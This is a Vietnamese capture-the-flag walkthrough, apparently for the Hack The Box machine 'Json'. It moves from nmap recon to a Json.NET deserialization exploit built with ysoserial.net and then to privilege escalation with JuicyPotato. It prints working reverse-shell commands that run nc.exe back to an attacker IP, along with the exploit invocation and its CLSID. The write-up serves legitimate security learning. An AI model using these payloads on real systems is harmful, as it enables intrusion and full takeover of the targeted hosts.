![image](https://hackmd.io/_uploads/ByZyXxz2A.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/210/information) 

## Comment

# Recon
## nmap
Sử dụng nmap ta, scan được rất nhiều port, trong đó có ftp, http, smb/rpc
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.158       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 11:19 EDT
Nmap scan report for 10.10.10.158
Host is up (0.23s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
```
Từ đây, ta sẽ scan tiếp các port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p21,80,135,139,445,49152-49158 -sCV 10.10.10.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 11:20 EDT
Nmap scan report for 10.10.10.158
Host is up (0.23s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: Json HTB
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-09-02T15:21:34
|_  start_date: 2024-09-02T08:12:26
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:1a:44 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds
```
## Port 80 - http 
Ta được điều hướng đến 1 form login

![image](https://hackmd.io/_uploads/BkG-38XhC.png)

Sau khi thử SQLi cơ bản và một số credential mặc định, thông tin đăng nhập bằng `admin:admin` cho ta chuyển tiếp đến `Dashboard`, tuy nhiên web này lại không có một tính năng nào cả

![image](https://hackmd.io/_uploads/H19I2LmhR.png)

Khi nhìn vào các gói tin bắt đuợc, endpoint `/api/Account` ta thấy session được mã hóa bằng base64. Điều này có thể xảy ra lỗ hổng **deserialize**

![image](https://hackmd.io/_uploads/rJHF-v7nR.png)

Tại `/api/token` ta có thể gửi request đi

![image](https://hackmd.io/_uploads/HyY7MPm2C.png)

## Port 445 - smb
Ta sẽ kiểm tra xem máy chủ này có shared folder nào không
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.158
session setup failed: NT_STATUS_ACCESS_DENIED
```
Lỗi này trả về có nghĩa là không có quyền truy cập

# User flag
## Json.net
Vì đã phát hiện lỗ hổng có thể xảy ra là deserialize. Ta sẽ cần xác định xem nó là lọai gì 

![image](https://hackmd.io/_uploads/ByFaSDmhR.png)

## ysoserial.net
Để khai thác được lỗ hổng này, ta có công cụ **[ysoserial.net](https://github.com/pwntester/ysoserial.net)** để tạo payload và gửi lại request

Để chạy được tool này, ta sẽ sử dụng trên máy Win. Trước tiên ta sẽ thử dùng lệnh ping xem nó có trả lời lại máy tấn công không
```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
```
Gen payload và request  

![image](https://hackmd.io/_uploads/HJdkAwmnA.png)

Thấy được nó đã ping trở lại 

![image](https://hackmd.io/_uploads/BJKa6v72C.png)

Bây giờ ta sẽ gen payload tạo reverse shell sau đó dùng `impacket-smbserver` để server nhận được file `nc.exe` để thực thi 

![image](https://hackmd.io/_uploads/BJua-dm2R.png)

```
ysoserial.exe -g ObjectDataProvider -f json.net -c "\\\\10.10.14.93\\home\kali\Downloads\\nc.exe -e cmd.exe 10.10.14.93 1414" -o base64
```
Request với payload ta sẽ nhận được shell

![image](https://hackmd.io/_uploads/HJ58e_XnR.png)

Lấy được user flag
```
c:\Users\userpool\Desktop>type user.txt
type user.txt
bda3433f09ae8326fb*****
```

# Root flag
## whoami /priv
Ta sẽ dùng `whoami /priv` để xem các quyền hiện tại có 

![image](https://hackmd.io/_uploads/SJ9KGO72R.png)

Ở đây ta phát hiện được quyền [SeImpersonate](https://github.com/gtworek/Priv2Admin) đang được **Enable**. Ta có thể dùng các công cụ thuộc [Potato family](https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070) để leo quyền:

- Upload `nc.exe` và [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) vào máy mục tiêu

![image](https://hackmd.io/_uploads/HJXaJFmnR.png)

- Tạo reverse shell để mở port cho máy tấn công truy cập vào
```
c:\tmp>echo c:\tmp\nc.exe 10.10.14.93 1414 -e cmd.exe > shell.bat
echo c:\tmp\nc.exe 10.10.14.93 1414 -e cmd.exe > shell.bat
```
## JuicyPotato
Sau đó chạy JuicyPotato.exe trên máy mục tiêu. [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter)
```
c:\tmp>juicy.exe -l 443 -p shell.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

-c {e60687f7-01a1-40aa-86ac-db1cbf673334}: CLSID này đại diện cho một đối tượng COM mà juicy.exe sẽ tương tác để thực hiện tấn công leo thang đặc quyền.
```

![image](https://hackmd.io/_uploads/H18U-YXnR.png)

```
C:\Windows\system32>type C:\Users\superadmin\Desktop\root.txt
type C:\Users\superadmin\Desktop\root.txt
8315dddb833114f4******
```

![image](https://hackmd.io/_uploads/rJQmQtX3C.png)



